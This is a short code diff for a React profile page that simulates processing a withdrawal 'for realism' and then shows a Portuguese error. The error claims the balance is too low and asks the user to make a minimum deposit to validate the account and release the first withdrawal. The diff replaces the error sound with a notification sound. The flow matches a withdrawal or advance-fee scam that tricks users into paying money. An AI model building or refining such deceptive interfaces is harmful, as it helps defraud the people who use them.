@@ -78,7 +78,7 @@ export default function PerfilPage() {
     
     // Simulação de processamento para dar realismo
     setTimeout(() => {
-      playSound('error');
+      playSound('notification');
       toast.error("Saldo insuficiente para processar o saque", {
         description: "O seu saldo está muito baixo. É necessário fazer um depósito mínimo para validar a sua conta e libertar o seu primeiro levantamento.",
         duration: 6000,
